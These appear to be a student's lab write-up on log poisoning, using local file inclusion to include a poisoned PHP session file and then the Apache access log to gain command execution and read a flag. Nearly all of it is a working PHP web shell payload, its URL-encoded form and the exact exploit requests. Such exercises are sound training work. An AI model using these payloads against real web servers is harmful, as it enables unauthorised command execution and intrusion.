# [Log Poisoning](Log%20Poisoning.md)
### Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd

My SESSID `4lpn3cem9186uptnf42fgujguv` 
![](Screenshot%202026-07-01%20at%2013.00.03.png)

Encode the payload PHP
```php
<?php system($_GET['cmd']); ?>
```
To this
```
%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
So the request is 
```url
index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

```url
http://154.57.164.83:30794/index.php?language=/var/lib/php/sessions/sess_4lpn3cem9186uptnf42fgujguv&cmd=id
```
![](Screenshot%202026-07-01%20at%2013.11.27.png)
![](Screenshot%202026-07-01%20at%2013.12.18.png)
### Try to use a different technique to gain RCE and read the flag at /
![](Screenshot%202026-07-01%20at%2013.15.06.png)
### Try to use a different technique to gain RCE and read the flag at /

![](Screenshot%202026-07-01%20at%2013.17.30.png)

`<?php system($_GET['cmd']); ?>`
![](Screenshot%202026-07-01%20at%2013.19.10.png)
![](Screenshot%202026-07-01%20at%2013.21.18.png)
![](Screenshot%202026-07-01%20at%2013.23.41.png)

```
GET /index.php?language=/var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt HTTP/1.1
```
![](Screenshot%202026-07-01%20at%2013.24.09.png)
